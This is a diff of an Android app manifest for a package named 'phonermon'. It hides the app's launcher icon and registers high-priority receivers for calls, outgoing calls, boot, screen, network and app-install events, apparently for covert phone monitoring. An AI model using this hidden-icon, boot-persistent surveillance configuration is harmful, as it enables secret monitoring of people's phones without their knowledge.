@@ -29,30 +29,56 @@
         <activity
             android:name=".MainActivity"
             android:label="@string/app_name" >
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
+<!--             <intent-filter> -->
+<!--                 <action android:name="android.intent.action.MAIN" /> -->
 
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
+<!--                 <category android:name="android.intent.category.LAUNCHER" /> -->
+<!--             </intent-filter> -->
         </activity>
 
-        <receiver android:name="com.my.phonermon.SMSReceiver" >
-            <intent-filter android:priority="10000" >
-                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-                <action android:name="android.provider.Telephony.SMS_DELIVER" />
-            </intent-filter>
-        </receiver>
-        <receiver android:name="com.my.phonermon.PhoneStateReceiver" >
+<!--         <receiver android:name="com.my.phonermon.SMSReceiver" > -->
+<!--             <intent-filter android:priority="10000" > -->
+<!--                 <action android:name="android.provider.Telephony.SMS_RECEIVED" /> -->
+<!--                 <action android:name="android.provider.Telephony.SMS_DELIVER" /> -->
+<!--             </intent-filter> -->
+<!--         </receiver> -->
+        <receiver android:name="com.my.phonermon.broadcast.PhoneStateReceiver" >
             <intent-filter android:priority="10000" >
                 <action android:name="android.intent.action.PHONE_STATE" />
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             </intent-filter>
         </receiver>
-        <receiver android:name="com.my.phonermon.NetworkChangedReceiver" >
+        <receiver android:name="com.my.phonermon.broadcast.NetworkChangedReceiver" >
             <intent-filter android:priority="10000" >
                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
             </intent-filter>
         </receiver>
+        <receiver android:name="com.my.phonermon.broadcast.ScreenActionReceiver" >
+            <intent-filter android:priority="10000" >
+                <action android:name="android.intent.action.SCREEN_ON" />
+                <action android:name="android.intent.action.SCREEN_OFF"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.my.phonermon.broadcast.BootCompletedReceiver" >
+            <intent-filter android:priority="10000" >
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.my.phonermon.broadcast.AppInstallReceiver" >
+            <intent-filter android:priority="10000" >
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+            </intent-filter>
+        </receiver>
+        
+        <service android:name="com.my.phonermon.ScreenBroadcastService"
+            android:enabled="true"
+            android:exported="false" >
+            <intent-filter>
+                <action android:name="com.my.phonermon.ScreenBroadcastService"/>
+            </intent-filter>
+        </service>
 
         <meta-data
             android:name="bomb_app_id"
